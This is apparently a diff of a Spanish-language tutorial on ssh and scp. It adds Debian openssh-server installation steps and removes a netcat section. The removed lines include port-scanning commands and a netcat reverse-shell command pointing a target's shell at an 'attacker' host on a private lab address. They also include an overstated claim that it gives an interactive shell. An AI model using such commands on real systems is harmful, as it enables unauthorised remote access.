@@ -1,5 +1,33 @@
 # Comando ssh y scp
 
+## Comandos para instalar el servidor SSH en Debian
+
+Para instalar y configurar un servidor SSH en Debian, sigue estos pasos básicos desde la terminal:
+
+**1. Actualiza los repositorios:**
+```bash
+sudo apt update
+```
+
+**2. Instala el servidor SSH (paquete openssh-server):**
+```bash
+sudo apt install openssh-server
+```
+
+
+**3. Verifica que el servicio SSH esté activo:**
+```bash
+sudo systemctl status ssh
+```
+
+
+**4. (Opcional) Inicia, habilita y reinicia el servicio SSH para que arranque automáticamente:**
+```bash
+sudo systemctl start ssh
+sudo systemctl enable ssh
+sudo systemctl restart ssh
+```
+
 ## ssh
 
 El cliente (comando ssh) posee una configuración predeterminada que podemos modificar. El orden de prioridad de esa configuración es:
@@ -26,14 +54,6 @@ scp -r [-P port] user@hostname:remote_path local_path #Copiar directorios recurs
 scp [-P port] local_path user@hostname:remote_path #Copiar ficheros
 scp -r [-P port] local_path user@hostname:remote_path #Copiar directorios recursivamente
 ```
-
-Para comprobar el estado del servicio ssh pondemos hacer uso del comando `nc` (netcat) con las opciones `-v`: verbose y `-z`: nos devuelve el PROMPT del sistema.
-
-```bash
-nc -vz localhost 22
-```
-
-_*Nota*_: En la siguiente sección se detalla el uso de [netcat](#netcat).
 
 ### StrickHostKeyChecking
 
@@ -318,137 +338,6 @@ ssh -p 8733 user1@192.168.100.20 df -h && ls /tmp
 ```
 
 Este caso es incorrecto ya que el comando `df -h` se ejecutaría en el servidor pero el `ls /tmp` se lanzaría en el cliente si la conexión es exitosa por lo que tendríamos que poner entre comillas los dos comandos para no tener errores.
-
-## netcat
-
-Netcat (a menudo abreviado como `nc`) es una herramienta versátil de línea de comandos que permite establecer conexiones de red, tanto entrantes como salientes, utilizando los protocolos TCP y UDP. Es conocido como la "navaja suiza" de las herramientas de red debido a su amplio rango de funcionalidades.
-
-### **¿Qué se puede hacer con Netcat?**
-- **Escanear puertos** de un host.
-- **Transferir archivos** entre computadoras.
-- **Crear shells reversos** (muy usado en pruebas de penetración).
-- **Abrir puertos** y escuchar conexiones.
-- **Depurar y analizar** redes y servicios.
-- **Probar conexiones** TCP/UDP.
-
-### Uso Básico de Netcat
-
-#### 1. **Abrir un puerto y escuchar conexiones**:
-```bash
-nc -lvp 1234
-```
-- `-l` → Escuchar (listen).
-- `-v` → Modo detallado (verbose).
-- `-p 1234` → Puerto en el que se escuchará.
-
-##### Ejemplo de uso con kaliA y kaliB
-
-Para abrir un puerto y escuchar conexiones en un escenario con dos máquinas debemos tener los siguientes pasos:
-
-- **KaliA** con IP: 192.168.1.100
-- **KaliB** con IP: 192.168.1.101
-
-###### **Paso 1: Verificar la Instalación de Netcat**
-
-Antes de comenzar, asegúrese de que `netcat` esté instalado en ambas máquinas:
-
-```bash
-sudo apt install netcat  # Si no está instalado
-```
-
-###### **Paso 2: Abrir un Puerto en KaliA (192.168.1.100)**
-
-En **KaliA**, ejecute el siguiente comando para abrir un puerto y escuchar conexiones:
-
-```bash
-nc -lvp 1234
-```
-
-- `-l` : Modo escucha (listen).
-- `-v` : Modo detallado (verbose) para mostrar información de la conexión.
-- `-p 1234` : Puerto en el que Netcat estará escuchando (puedes elegir otro puerto si lo deseas).
-
-**Salida esperada:**
-
-```bash
-listening on [any] 1234 ...
-```
-
-> KaliA ahora está a la espera de conexiones entrantes en el puerto 1234.
-
-###### **Paso 3: Conectarse desde KaliB (192.168.1.101)**
-
-En **KaliB**, ejecute el siguiente comando para establecer la conexión con KaliA:
-
-```bash
-nc 192.168.1.100 1234
-```
-
-- `192.168.1.100` : Dirección IP de KaliA.
-- `1234` : Puerto en el que KaliA está escuchando.
-
-**Salida esperada en KaliA:**
-
-```bash
-connect to [192.168.1.100] from (UNKNOWN) [192.168.1.101] 45678
-```
-
-> La conexión ha sido establecida. Cualquier texto que escribas en una máquina será visto en la otra.
-
-###### **Paso 4: Verificar la Conexión**
-
-- Escribe cualquier mensaje en KaliB y lo verás en KaliA.
-- Escribe cualquier mensaje en KaliA y lo verás en KaliB.
-
-**Ejemplo:**
-
-```bash
-# En KaliB
-Hola KaliA
-```
-
-```bash
-# En KaliA
-Hola KaliB
-```
-
-#### 2. **Transferir archivos entre máquinas**:
-
-**En la máquina que recibe el archivo**:
-```bash
-nc -lvp 5555 > archivo_recibido.txt
-```
-
-**En la máquina que envía el archivo**:
-```bash
-nc 192.168.1.50 5555 < archivo_a_enviar.txt
-```
-
-#### 3. **Crear un shell reverso (muy usado en hacking)**:
-
-**En el atacante (escucha el shell)**:
-```bash
-nc -lvp 4444
-```
-
-**En el objetivo (abre el shell hacia el atacante)**:
-```bash
-/bin/bash | nc 192.168.1.100 4444
-```
-
-Esto dará al atacante un shell interactivo del sistema objetivo.
-
-#### 4. **Escanear puertos abiertos en una máquina**:
-```bash
-nc -zv 192.168.1.100 1-1000
-192.168.1.100: inverse host lookup failed: Host name lookup failure
-(UNKNOWN) [192.168.1.100] 22 (ssh) open
-```
-- `-z` → Escaneo sin enviar datos.
-- `-v` → Modo detallado.
-- `1-1000` → Rango de puertos a escanear.
-
-_*Nota*_: Como alternativa a`nc` tenemos `ncat` que ofrece como ventajas la posibilidad de realizar conexiones encriptadas por `ssl/tls`, soporte de IPv6 y limitar el número de conexiones simultaneas. 
 
 ---
 
